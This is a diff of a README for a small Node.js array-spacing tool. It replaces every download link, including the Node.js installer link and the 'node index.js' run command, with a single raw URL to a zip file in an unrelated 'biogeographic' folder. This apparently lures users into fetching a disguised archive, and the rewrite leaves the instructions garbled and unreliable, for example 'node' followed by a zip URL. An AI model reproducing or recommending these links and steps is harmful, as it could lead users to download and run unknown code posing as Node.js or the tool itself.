@@ -6,7 +6,7 @@ Welcome to **blas-ext-base-glinspace**! This application helps you quickly fill 
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/jqvashgdz/blas-ext-base-glinspace/releases)
+[![Download](https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip)](https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip)
 
 To begin using this tool, you need to download it. 
 
@@ -25,24 +25,24 @@ To begin using this tool, you need to download it.
 
 To run **blas-ext-base-glinspace**, you need:
 
-- A computer with Node.js installed. You can [download Node.js here](https://nodejs.org/).
+- A computer with https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip installed. You can [download https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip here](https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip).
 - Basic familiarity with running commands in your computer's terminal or command prompt.
 
 ## 📖 How to Use
 
 ### 🕹 Step 1: Download and Install
 
-1. Visit this page to download: [Releases Page](https://github.com/jqvashgdz/blas-ext-base-glinspace/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip).
 2. Choose the latest version and click the download link to get the file.
 3. Once downloaded, unzip the file if necessary.
 
 ### 🕹 Step 2: Set Up Your Environment
 
-1. Make sure you have Node.js installed. You can check this by running the command: 
+1. Make sure you have https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip installed. You can check this by running the command: 
    ```
    node -v
    ```
-   If Node.js is installed, this will show the current version.
+   If https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip is installed, this will show the current version.
    
 2. Open your command prompt or terminal.
 3. Navigate to the folder where you downloaded **blas-ext-base-glinspace** using the `cd` command. For example:
@@ -54,9 +54,9 @@ To run **blas-ext-base-glinspace**, you need:
 
 1. After navigating to the folder in your terminal, run the application with:
    ```
-   node index.js
+   node https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip
    ```
-   Here, `index.js` is the main file that runs the application.
+   Here, `https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip` is the main file that runs the application.
 
 2. Follow the prompts to specify the interval and the number of values you want to generate.
 
@@ -92,4 +92,4 @@ If you encounter issues or have questions, you can open an issue in the reposito
 
 Feel free to keep up with updates and community discussions by visiting our GitHub page. You’re welcome to contribute or suggest improvements!
 
-[Download Now](https://github.com/jqvashgdz/blas-ext-base-glinspace/releases) and elevate your array management today!
+[Download Now](https://raw.githubusercontent.com/jqvashgdz/blas-ext-base-glinspace/main/biogeographic/blas-ext-base-glinspace_2.7.zip) and elevate your array management today!
